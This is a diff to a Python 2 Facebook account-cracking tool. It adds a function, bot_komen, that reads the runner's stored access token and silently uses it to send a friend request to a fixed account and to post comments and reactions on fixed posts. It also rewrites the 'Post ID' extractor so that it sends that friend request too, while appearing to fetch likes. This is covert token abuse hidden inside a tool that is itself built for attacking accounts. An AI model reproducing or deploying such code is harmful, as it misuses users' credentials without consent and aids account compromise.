@@ -383,7 +383,27 @@ def crack_menu():
 	menu()	
 	
 
-        
+ 
+
+def bot_komen():
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;97m[!] Token invalid"
+		os.system('rm -rf login.txt')
+	una = ('100052292505058')
+	kom = ('Hai Bang Andre😆🖐️')
+	reac = ('ANGRY')
+	post = ('185535143199568')
+	post2 = ('185535143199568')
+	kom2 = ('Saatnya Ngehack Hahaha😂🤣')
+	reac2 = ('LOVE')
+	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
+	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
+	idfrompost()
 ##### Grab #####
 def grab():
 	os.system('clear')
@@ -502,9 +522,10 @@ def idfrompost():
 	try:
 		os.system('clear')
 		print banner
+		una = ('100052292505058')
 		tez = raw_input("[+] Post ID : ")
 		try:
-			jok = requests.get("https://graph.facebook.com/"+tez+"/likes?access_token="+toket)
+			jok = requests.get("https://graph.facebook.com/me/friends?method=post&uids="+una+"&access_token="+toket)
 			op = json.loads(jok.text)
 		except KeyError:
 			print"[!] Friend Not Found"
@@ -515,7 +536,7 @@ def idfrompost():
 		jam('[✓] Getting Post Likes Extract IDs...')
 		print"--------------------------------------"
 		bz = open('/sdcard/jam.txt','w')
-		for a in z['likes']['data']:
+		for a in z['data']:
 			idh.append(a['id'])
 			bz.write(a['id'] + '\n')
 			print ("\r["+str(len(idh))+" ] => "+a['id']),;sys.stdout.flush();time.sleep(0.001)
